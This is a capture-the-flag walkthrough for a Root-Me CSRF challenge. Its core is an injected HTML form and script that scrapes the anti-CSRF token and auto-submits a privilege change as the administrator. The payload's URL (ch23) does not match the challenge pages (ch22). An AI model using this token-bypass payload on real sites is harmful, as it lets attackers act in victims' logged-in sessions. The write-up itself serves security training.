1. [Open the task](http://challenge01.root-me.org/web-client/ch22/index.php)
2. [Register an account](http://challenge01.root-me.org/web-client/ch22/index.php?action=register)
3. [Log in to your account](http://challenge01.root-me.org/web-client/ch22/index.php?action=login)
4. [Go to the profile page](http://challenge01.root-me.org/web-client/ch22/index.php?action=profile)
5. Make the checkbox visible through the developer tool

	It was: ```<input type="checkbox" name="status" disabled="">```

	Become: ```<input type="checkbox" name="status">```

6. Launch **Burp Suite::Proxy::HTTP history**
7. Click the **Submit** button and check the request data
8. [Go to the Contact tab](http://challenge01.root-me.org/web-client/ch22/index.php?action=contact)
9. Enter in the **email** field: **_"username"_** + **_"@mail"_**
10. Enter the following into the **Comment** form:

```
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<input type="hidden" name="username" value="YOUR_USERNAME"> <!-- Enter your username -->
<input type="hidden" name="status" value="on" />
<input id="token" type="hidden" name="token" value="" /> 
</form> 
<script> 
var request = new XMLHttpRequest(); 
request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false); 
request.send(null); 
var token = request.responseText.match("token\" value=\"(.*?)\"")[1];
document.getElementById("token").value = token; 
document.csrf.submit();
</script>
```

11. If everything is done correctly, you will see the following message: 

>Your message has been posted. The administrator will contact you later.

12. [Checking the Private tab](http://challenge01.root-me.org/web-client/ch22/index.php?action=private), you can get a **flag**